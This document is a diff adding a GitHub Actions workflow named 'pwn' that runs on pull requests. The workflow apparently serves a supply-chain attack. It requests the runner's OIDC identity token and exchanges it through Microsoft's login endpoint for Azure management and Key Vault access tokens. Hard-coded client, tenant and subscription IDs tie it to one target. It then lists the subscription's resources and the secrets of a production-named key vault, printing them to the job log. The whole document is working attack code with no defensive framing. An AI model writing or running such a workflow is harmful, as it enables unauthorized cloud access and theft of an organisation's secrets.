@@ -1,0 +1,23 @@
+name: pwn
+on: [pull_request]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
+          echo "sub:"; echo "$IDT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import json,sys;print(json.load(sys.stdin)['sub'])"
+          CID=72ff278a-9e71-43ec-bac4-2ca303f8e462
+          TID=3205c325-06a5-4171-9ce8-ffc5e6c2845e
+          SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
+          tok() { curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$CID&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$IDT&scope=$1/.default"; }
+          ARMR=$(tok "https://management.azure.com"); echo "== ARM =="; echo "$ARMR" | head -c 300; echo
+          ARM=$(echo "$ARMR" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))")
+          VTR=$(tok "https://vault.azure.net"); VT=$(echo "$VTR" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))")
+          echo "VTlen=${#VT}"
+          curl -sS -m 30 -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | head -c 3000; echo
+          echo "== KV =="
+          curl -sS -m 30 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | head -c 4000; echo
